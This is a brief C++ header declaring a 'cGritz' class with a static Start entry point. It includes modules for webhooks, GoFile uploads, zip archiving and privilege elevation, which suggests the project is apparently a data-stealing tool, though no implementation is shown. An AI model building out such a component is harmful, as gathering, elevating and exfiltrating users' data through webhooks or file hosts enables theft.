#pragma once
#include <utils/Utils.h>
#include <webhook/Webhook.h>
#include <upload/GoFileUpload.h>
#include <upload/ZipFile.h>
#include <elevation/Elevation.h>

namespace gritz
{
	class cGritz final
	{
	private:

	public:
		static void Start(char** args);
	};
}